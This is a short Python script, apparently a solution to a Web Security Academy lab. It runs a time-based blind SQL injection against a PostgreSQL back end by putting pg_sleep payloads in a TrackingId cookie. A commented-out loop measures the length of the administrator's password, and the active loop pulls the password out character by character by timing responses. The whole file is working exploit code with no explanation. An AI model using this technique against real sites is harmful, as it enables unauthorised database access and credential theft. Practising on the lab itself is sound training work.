
import requests as rq

# i=1
# while(True):
    
#     print(i)

#     payload = "'%3b+(select+pg_sleep(10)+from+users+where+username%3d'administrator'+and+length(password)={0})--".format(i)

#     cookie = {
#         "TrackingId" : "G0Z4GwLmVrVXoGwT" + payload
#     }
#     res = rq.request(
#         "GET",
#         "https://0a01009403700b10801c945f004e0085.web-security-academy.net/",
#         cookies=cookie
#     )
    
#     if res.elapsed.total_seconds() > 5:
#         break
#     else:
#         i += 1

lis = [i for i in range(0,10)]
lis += [chr(i) for i in range(97,123)]
lis += [chr(i) for i in range(65,91)]

password = ""
for i in range(1,21):
    for j in lis:
        print(i,j)
        payload = "'%3b+(select+pg_sleep(3)+from+users+where+username%3d'administrator'+and+substr((password),{0},1)%3d'{1}')--".format(i,j)

        cookie = {  
            "TrackingId" : "G0Z4GwLmVrVXoGwT" + payload
        }
        res = rq.request(
            "GET",
            "https://0a01009403700b10801c945f004e0085.web-security-academy.net/",
            cookies=cookie
        )
        
        if res.elapsed.total_seconds() > 2:
            password += str(j)
            break

print(password)